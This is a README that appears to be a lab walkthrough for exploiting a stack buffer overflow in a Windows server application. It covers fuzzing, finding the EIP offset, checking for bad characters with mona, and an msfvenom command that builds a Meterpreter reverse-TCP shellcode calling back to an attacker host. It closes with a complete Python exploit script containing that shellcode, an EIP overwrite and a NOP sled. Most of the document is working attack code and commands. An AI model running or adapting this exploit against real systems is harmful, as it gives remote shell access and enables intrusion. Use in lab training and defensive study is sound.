# Buffer Overflow exploitation cheat
This article shows the basic necessary steps and tools to **identifie** and **exploit** a Buffer Overflow vulnerbality in Windows server application.
### Vulnerability Identification
```bash
s_readline();
s_string("OVERFLOW1 ");
s_string_variable("0");
```
generic_send_tcp 10.10.10.10. 1337 stats.spk 0 0

![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/1.png?raw=true)

### Identifie total_length
![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/2.png?raw=true)

![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/3.png?raw=true)

### Identifie EIP
msf-pattern_create –l 2984

![alt text](https://github.com/ydy4/BOF_simple_steps/blob/main/github/4.png?raw=true)
```bash

#! /usr/bin/python
import socket
s = socket.socket()
s.connect(("10.10.242.108",1337))
total_length = 2984
payload=[b"OVERFLOW1 /",b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv"]
payload = b"".join(payload)
s.send(payload)
s.close()
```
EIP = 43396E43

![5.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/5.png?raw=true)

### Identifie Offset
msf-pattern_offset –l 2984 –q 43396E43.

![5.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/6.png?raw=true)

Offset = 1977
 ### Identifie ESP
 ![7.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/7.png?raw=true)
ESP = 62501203
### Identifie Bad Characters
!mona bytearray -b "\x00"

![8.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/8.png?raw=true)

![9.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/9.png?raw=true)

now we compare with the dump of  ESP = 019FF130.

![10.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/10.png?raw=true)

!mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 019FFA30.

![11.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/11.png?raw=true)
### Create ShellCode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.160.125 LPORT=6666 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
![12.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/12.png?raw=true)
```bash
#! /usr/bin/python
import socket
import struct
s = socket.socket()
s.connect(("10.10.243.80",1337))
total_length = 2984
nop_sled = b"\x90" * 16
offset = 1977
payload =  b""
payload += b"\xbb\xb5\xec\xba\x01\xdb\xd9\xd9\x74\x24\xf4\x5e"
payload += b"\x29\xc9\xb1\x5e\x83\xee\xfc\x31\x5e\x11\x03\x5e"
payload += b"\x11\xe2\x40\x10\x52\x8e\xaa\xe9\xa3\xf1\x23\x0c"
payload += b"\x92\x23\x57\x44\x87\xf3\x1c\x08\x24\x7f\x70\xb9"
payload += b"\x05\x80\x7b\x76\x2f\x58\x08\x0a\x98\x95\xce\x47"
payload += b"\xe4\xb4\xb2\x95\x39\x17\x8b\x55\x4c\x56\xcc\x23"
payload += b"\x3a\xb7\x80\x38\x96\x57\xaf\x7d\x2b\x0f\xae\x51"
payload += b"\xd8\xef\xc8\xd4\x1f\x9b\x64\xd6\x4f\x34\xff\x80"
payload += b"\x4f\xb4\x2c\xbb\xd8\xae\x57\x75\xac\xf2\x1e\x0d"
payload += b"\x79\x80\x91\xee\x83\x40\xe0\xd0\x45\xa3\x0f\x7d"
payload += b"\x44\xfb\x37\x9d\x32\xf7\x44\x20\x45\xcc\x37\xfe"
payload += b"\xc0\xd3\x9f\x75\x72\x30\x1e\x59\xe5\xb3\x2c\x16"
payload += b"\x61\x9b\x30\xa9\xa6\x97\x4c\x22\x49\x78\xc5\x70"
payload += b"\x6e\x5c\x8e\x23\x0f\xc5\x6a\x85\x30\x15\xd2\x7a"
payload += b"\x95\x5d\xf0\x6d\xa9\x9d\x0b\x92\xf7\x09\xc0\x5f"
payload += b"\x08\xca\x4e\xd7\x7b\xf8\xd1\x43\x14\xb0\x9a\x4d"
payload += b"\xe3\xc1\x8c\x6d\x3b\x69\xdc\x93\xbc\x8a\xf5\x57"
payload += b"\xe8\xda\x6d\x71\x91\xb0\x6d\x7e\x44\x2c\x67\xe8"
payload += b"\x6d\xb9\xd7\x95\x19\xbb\x17\x7c\xd0\x32\xf1\xd0"
payload += b"\xb4\x14\xad\x90\x64\xd5\x1d\x79\x6f\xda\x42\x99"
payload += b"\x90\x30\xeb\x30\x7f\xed\x44\xad\xe6\xb4\x1e\x4c"
payload += b"\xe6\x62\x5b\x4e\x6c\x87\x9c\x01\x85\xe2\x8e\x76"
payload += b"\xf2\x0c\x4e\x87\x97\x0c\x24\x83\x31\x5a\xd0\x89"
payload += b"\x64\xac\x7f\x71\x43\xae\x87\x8d\x12\x87\xfc\xb8"
payload += b"\x80\xa7\x6a\xc5\x44\x28\x6a\x93\x0e\x28\x02\x43"
payload += b"\x6b\x7b\x37\x8c\xa6\xef\xe4\x19\x49\x46\x59\x89"
payload += b"\x21\x64\x84\xfd\xed\x97\xe3\x7d\xe9\x68\x76\xaa"
payload += b"\x52\x01\x88\xea\x62\xd1\xe2\xea\x32\xb9\xf9\xc5"
payload += b"\xbd\x09\x02\xcc\x95\x01\x89\x81\x54\xb3\x8e\x8b"
payload += b"\x39\x6d\x8f\x38\xe2\x9e\xea\x31\x15\x5f\x0b\x58"
payload += b"\x72\x5f\x0c\x64\x84\x63\xdb\x5d\xf2\xa2\xd8\xd9"
payload += b"\x1d\x39\xf4\x17\xb6\xe4\x9d\x95\xdb\x16\x48\xd9"
payload += b"\xe5\x94\x78\xa2\x11\x84\x09\xa7\x5e\x02\xe2\xd5"
payload += b"\xcf\xe7\x04\x49\xef\x2d"
new_EIP = struct.pack("<I",0x62501203)
payload=[b"OVERFLOW1 /",
b"A"*offset,
new_EIP,
nop_sled,
payload,
b"C"*(total_length - offset - len(new_EIP) - len(nop_sled) - len(payload))]
payload = b"".join(payload)
s.send(payload)
s.close()
```
### Running the exploit 
![13.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/13.png?raw=true)
![14.png](https://github.com/ydy4/BOF_simple_steps/blob/main/github/14.png?raw=true)

